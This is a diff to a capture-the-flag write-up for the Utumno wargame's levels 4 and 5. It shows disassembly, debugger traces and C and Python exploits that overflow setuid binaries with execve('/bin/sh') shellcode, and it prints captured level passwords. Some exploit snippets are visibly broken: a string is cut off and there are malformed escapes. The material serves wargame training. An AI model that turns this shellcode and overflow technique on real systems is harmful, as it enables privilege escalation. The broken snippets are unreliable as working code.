@@ -368,7 +368,7 @@ zuudafiine
  804846e:	66 90                	xchg   %ax,%ax
 ```
 
-From this assembly, we found that the logic can be a little difficult to understand, so we can use tool to help us.
+From this assembly, we found that the logic can be a little difficult to understand, so we can use tool to help decompile the program.
 
 phidra: https://github.com/NationalSecurityAgency/ghidra
 
@@ -437,3 +437,259 @@ $1 = {<text variable, no debug info>} 0xf7e4c850 <system>
 We can not use the stack
 
 return to libc
+
+# level4
+
+```shell
+utumno4@utumno:/utumno$ file utumno4
+utumno4: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cb2abb9ecb95965e254760b5b1940e5efff1a807, not stripped
+
+utumno4@utumno:/utumno$ utumno4 123456
+-bash: utumno4: command not found
+
+utumno4@utumno:/utumno$ ltrace ./utumno4 123456
+__libc_start_main(0x804844b, 2, 0xffffd744, 0x80484a0 <unfinished ...>
+atoi(0xffffd87f, 0, 0, 0)                             = 0x1e240
+exit(1 <no return ...>
++++ exited (status 1) +++
+```
+
+use `objdump -d ./utumno4` to get assembly code.
+
+```assembly
+0804844b <main>:
+ 804844b:	55                   	push   %ebp
+ 804844c:	89 e5                	mov    %esp,%ebp
+ 804844e:	81 ec 04 ff 00 00    	sub    $0xff04,%esp
+ 8048454:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 8048457:	83 c0 04             	add    $0x4,%eax
+ 804845a:	8b 00                	mov    (%eax),%eax
+ 804845c:	50                   	push   %eax
+ 804845d:	e8 ce fe ff ff       	call   8048330 <atoi@plt>
+ 8048462:	83 c4 04             	add    $0x4,%esp
+ 8048465:	89 45 fc             	mov    %eax,-0x4(%ebp)
+ 8048468:	8b 45 fc             	mov    -0x4(%ebp),%eax
+ 804846b:	66 89 45 fa          	mov    %ax,-0x6(%ebp)
+ 804846f:	66 83 7d fa 3f       	cmpw   $0x3f,-0x6(%ebp)
+ 8048474:	76 07                	jbe    804847d <main+0x32>
+ 8048476:	6a 01                	push   $0x1
+ 8048478:	e8 93 fe ff ff       	call   8048310 <exit@plt>
+ 804847d:	8b 55 fc             	mov    -0x4(%ebp),%edx
+ 8048480:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 8048483:	83 c0 08             	add    $0x8,%eax
+ 8048486:	8b 00                	mov    (%eax),%eax
+ 8048488:	52                   	push   %edx
+ 8048489:	50                   	push   %eax
+ 804848a:	8d 85 fe 00 ff ff    	lea    -0xff02(%ebp),%eax
+ 8048490:	50                   	push   %eax
+ 8048491:	e8 6a fe ff ff       	call   8048300 <memcpy@plt>
+ 8048496:	83 c4 0c             	add    $0xc,%esp
+ 8048499:	b8 00 00 00 00       	mov    $0x0,%eax
+ 804849e:	c9                   	leave
+ 804849f:	c3                   	ret
+```
+
+jbe uses unsigned number(all jump instructions use unsigned) , jbe compares with the second parameter you input with 0x3f. 
+
+which means, we need to make the 16-low bits of the second parameter smaller than 0x003f
+
+Insert the shellcode in the environment, than find the address.
+
+Another way is to put the shellcode in the stack.
+
+int(0xff02) = 65282
+
+0xffffdea3
+
+\xa3\xde\xff\xff
+
+```
+utumno4@utumno:/tmp/utu4$ /utumno/utumno4 65536 $(python -c 'print "a"*65286+"\xa3\xde\xff\xff"')
+bash-4.4$ whoami
+utumno5
+bash-4.4$ cat /etc/utumno_pass/utumno5
+woucaejiek
+```
+
+# level5
+
+```shell
+utumno5@utumno:/utumno$ file utumno5
+utumno5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=264ea5eac8d3b9212458489b2e253740d44c69f7, not stripped
+```
+
+strcpy(dest, src)
+
+```assembly
+08048516 <main>:
+ 8048516:	55                   	push   %ebp
+ 8048517:	89 e5                	mov    %esp,%ebp
+ 8048519:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
+ 804851d:	74 14                	je     8048533 <main+0x1d>
+ 804851f:	68 f0 85 04 08       	push   $0x80485f0
+ 8048524:	e8 57 fe ff ff       	call   8048380 <puts@plt>
+ 8048529:	83 c4 04             	add    $0x4,%esp
+ 804852c:	6a 01                	push   $0x1
+ 804852e:	e8 5d fe ff ff       	call   8048390 <exit@plt>
+ 8048533:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 8048536:	83 c0 28             	add    $0x28,%eax
+ 8048539:	8b 00                	mov    (%eax),%eax
+ 804853b:	50                   	push   %eax
+ 804853c:	68 f5 85 04 08       	push   $0x80485f5
+ 8048541:	e8 1a fe ff ff       	call   8048360 <printf@plt>
+ 8048546:	83 c4 08             	add    $0x8,%esp
+ 8048549:	8b 45 0c             	mov    0xc(%ebp),%eax
+ 804854c:	83 c0 28             	add    $0x28,%eax
+ 804854f:	8b 00                	mov    (%eax),%eax
+ 8048551:	50                   	push   %eax
+ 8048552:	e8 84 ff ff ff       	call   80484db <hihi>
+ 8048557:	83 c4 04             	add    $0x4,%esp
+ 804855a:	b8 00 00 00 00       	mov    $0x0,%eax
+ 804855f:	c9                   	leave
+ 8048560:	c3                   	ret
+ 8048561:	66 90                	xchg   %ax,%ax
+ 8048563:	66 90                	xchg   %ax,%ax
+ 8048565:	66 90                	xchg   %ax,%ax
+ 8048567:	66 90                	xchg   %ax,%ax
+ 8048569:	66 90                	xchg   %ax,%ax
+ 804856b:	66 90                	xchg   %ax,%ax
+ 804856d:	66 90                	xchg   %ax,%ax
+ 804856f:	90                   	nop
+```
+
+From the assembly, we need to trigger the branch which will call function hihi. So when utumno5 runs, the argv should be zero.
+
+```c
+// a.c, call utumno5 with argv zero
+#include <stdio.h>
+#include <unistd.h>
+int main( ) {
+    char *argv[] = {NULL};
+    execv("/utumno/utumno5", argv);
+    return 0;
+}
+```
+
+```shell
+gcc -m32 -o a.out a.c
+```
+
+Then let's look at hihi function.
+
+```assembly
+080484db <hihi>:
+ 80484db:	55                   	push   %ebp
+ 80484dc:	89 e5                	mov    %esp,%ebp
+ 80484de:	83 ec 0c             	sub    $0xc,%esp
+ 80484e1:	ff 75 08             	pushl  0x8(%ebp)
+ 80484e4:	e8 b7 fe ff ff       	call   80483a0 <strlen@plt>
+ 80484e9:	83 c4 04             	add    $0x4,%esp
+ 80484ec:	83 f8 13             	cmp    $0x13,%eax
+ 80484ef:	76 13                	jbe    8048504 <hihi+0x29>
+ 80484f1:	6a 14                	push   $0x14
+ 80484f3:	ff 75 08             	pushl  0x8(%ebp)
+ 80484f6:	8d 45 f4             	lea    -0xc(%ebp),%eax
+ 80484f9:	50                   	push   %eax
+ 80484fa:	e8 c1 fe ff ff       	call   80483c0 <strncpy@plt>
+ 80484ff:	83 c4 0c             	add    $0xc,%esp
+ 8048502:	eb 0f                	jmp    8048513 <hihi+0x38>
+ 8048504:	ff 75 08             	pushl  0x8(%ebp)
+ 8048507:	8d 45 f4             	lea    -0xc(%ebp),%eax
+ 804850a:	50                   	push   %eax
+ 804850b:	e8 60 fe ff ff       	call   8048370 <strcpy@plt>
+ 8048510:	83 c4 08             	add    $0x8,%esp
+ 8048513:	90                   	nop
+ 8048514:	c9                   	leave
+ 8048515:	c3                   	ret
+```
+
+strcpy is an unsafe function because it doesn't check the lenghth of sources string of copying. but srcncpy will check the length of resources string. So we need to trigger the strcpy function. The trigger condition is 
+
+```assembly
+ 80484ec:	83 f8 13             	cmp    $0x13,%eax
+ 80484ef:	76 13                	jbe    8048504 <hihi+0x29>
+```
+
+We can check what's the resource string the strcpy function copys from.
+
+```shell
+utumno5@utumno:/tmp/utum5$ ltrace ./a.out
+__libc_start_main(0x56555590, 1, 0xffffd754, 0x565555e0 <unfinished ...>
+execv("/utumno/utumno5", 0xffffd69c <no return ...>
+--- Called exec() ---
+__libc_start_main(0x8048516, 0, 0xffffd754, 0x8048570 <unfinished ...>
+printf("Here we go - %s\n", "LC_TERMINAL_VERSION=3.3.6"Here we go - LC_TERMINAL_VERSION=3.3.6
+) = 39
+strlen("LC_TERMINAL_VERSION=3.3.6")                   = 25
+strncpy(0xffffd6a0, "LC_TERMINAL_VERSION=", 20)       = 0xffffd6a0
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+
+we can find out where is the environment `LC_TERMINAL_VERSION` is:
+
+```shell
+(gdb) x/s *((char **)environ+10)
+0xffffdedf:	"LC_TERMINAL=iTerm2"
+(gdb) x/s *((char **)environ+11)
+0xffffdef2:	"SSH_CLIENT=24.59.157.177 50175 22"
+(gdb) x/s *((char **)environ+12)
+0xffffdf14:	"LC_TERMINAL_VERSION=3.3.6"
+```
+
+
+
+```
+#include <stdio.h>
+#include <unistd.h>
+int main( ) {
+    char *argv[]={NULL};
+    char *env[12];
+    env[0]=env[1]=env[2]=env[3]=env[4]=env[5]=env[6]=env[7]=env[8]=env[9]="";
+    env[9] = "";
+    env[10] = "LC_TERMINAL_VERSION=\xcd\xdf\xff\xff\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f$
+    env[11] = NULL;
+    execve("/utumno/utumno5",argv,env);
+    return 0;
+}
+
+
+#include <stdio.h>
+#include <unistd.h>
+int main( ) {
+    char *argv[]={NULL};
+    argv[9] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x28\xdf\xff\xff";
+    argv[10] = "LC_TERMINAL_VERSION=\xcd\xdf\xff\xff\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";
+    execve("/utumno/utumno5", NULL,argv);
+    return 0;
+}
+```
+
+
+
+
+
+it works!
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char** argv) {
+	char* argc[] = {NULL};
+	char* env[] = {"AAAA", "AAAA", "AAAA", "AAAA" ,"AAAA","AAAA",
+	"AAAA","AAAA",
+	"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80",
+	"BBBBBBBBBBBBFFFF\xbd\xdf\xfsf\xff", NULL};
+	execve("/utumno/utumno5", argc, env);
+	perror("execve");
+}
+```
+
+
+
+
+
+# level6
+
